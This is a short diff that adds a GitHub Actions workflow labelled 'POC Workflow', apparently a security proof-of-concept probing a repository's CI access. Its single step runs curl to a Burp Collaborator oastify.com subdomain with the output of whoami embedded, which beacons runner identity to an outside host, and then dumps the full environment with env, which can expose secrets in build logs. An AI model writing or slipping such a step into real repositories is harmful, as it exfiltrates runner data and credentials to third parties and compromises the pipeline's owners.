@@ -1,0 +1,15 @@
+name: POC Workflow
+on:
+  workflow_dispatch:
+jobs:
+  poc:
+    runs-on: macos-latest
+    steps:
+      - name: Show Access Level
+        run: |
+          curl "$(whoami).w2z7uvnrof96ppry5q8ve3cmodu4ivnjc.oastify.com"
+          echo "Repository Access Level:"
+          echo "Current SHA: ${{ github.sha }}"
+          echo "Workflow ref: ${{ github.ref }}"
+          echo "Environment:"
+          env
